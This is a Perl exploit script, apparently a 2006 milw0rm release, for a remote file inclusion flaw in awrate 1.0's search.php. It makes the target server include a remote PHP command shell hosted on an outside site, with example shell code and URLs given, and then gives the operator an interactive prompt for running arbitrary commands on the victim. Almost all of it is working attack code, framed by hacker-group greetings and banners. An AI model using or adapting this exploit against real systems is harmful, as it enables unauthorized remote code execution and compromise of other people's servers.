#!/usr/bin/perl
##
# Portal Name : awrate 1.0(search.php) Remote File Inclusion Exploit
#BUG: http://[target]/[Path]/search.php?toroot=http
#Vulnerable Code: include_once("$toroot../commonphp/table.php.inc");;
# Bug Found DeltahackingTEAM Code :Dr.Trojan&Dr.Pantagon
##
# Download =http://mesh.dl.sourceforge.net/sourceforge/awrate/awrate-1.0.zip
#
##
# usage:perl delta.pl <target> <cmd shell location> <cmd shell variable>
#
#
# perl delta.pl  http://[target]/[path]/engine/exec/
http://site.com/cmd.txt cmd
#
# cmd shell example: <?passthru($_GET[cmd]);?>
#
# cmd shell variable: ($_GET[cmd]);
##
##
#Greetz: Dr.Trojan , Hiv++ , D_7j ,Vpc,Lord,Str0ke,Tanha
#
# Contact:dr.trojan@deltasecurity.ir info@takserver.ir
##
# WebSite:www.deltasecurity.ir
##
#128 Bit Security Server:www.takserver.ir
##

use LWP::UserAgent;
$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];
if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}
head();
while()
{
       print "[shell] \$";
while(<STDIN>)
       {
               $cmd=$_;
                chomp($cmd);
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET
=>$Path.'search.php?toroot='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or
die "\nCould Not connect\n";
$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[?..?.??]/;
if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}
elsif ($return =~/failed to open stream: HTTP request failed!/ || $return
=~/: Cannot execute a blank command in <b>/)
       {print "\nCould Not Connect to cmd Host or Invalid Command
Variable\n";exit}
 elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No
 Return\n\n"}
if($return =~ /(.*)/)

 {
       $finreturn = $1;
       $finreturn=~ tr/[?..?.??]/[\n]/;
      print "\r\n$finreturn\n\r";
        last;
 }
 else {print "[shell] \$";}}}last;
sub head()
 {
  print

"\n============================================================================\r\n";
 print " *We Are 1 in Iran & 4in W0rld We Server:http://takserver.ir
                       Sec=128bit or 512 kbps *\r\n";
 print

"============================================================================\r\n";
  }
sub usage()
 {
 head();
 print " Usage: perl delta.pl <target> <cmd shell location> <cmd
shellvariable>\r\n\n";

  print " <Site> - Full path to wob-0.1 ex:
http://[target]/[path]/includes \r\n";
 print "<cmd shell> - Path to cmd Shell
 e.g http://d4wood.by.ru/cmd.gif
 \r\n";
  print " <cmd variable> - Command variable used in php shell \r\n";
 print
"============================================================================\r\n";
 print "                         Bug Found DeltahackingTEAM \r\n";
 print "                       Iranian Are The Best In World \r\n";
 print "
Dr.Trojan,HIV++,D_7j,Lord,VPc,IMpostor,Dr.Pantagon,Vampire\r\n";
 print "                      http://advistory.deltasecurity.ir((we
Bug))\r\n";
 print "                         http://www.deltasecurity.ir\r\n";
 print "                  Irane Sar Bolande MAn Sar Boland Khahad Mand";
 print
"============================================================================\r\n";
 exit();
  }

# milw0rm.com [2006-12-02]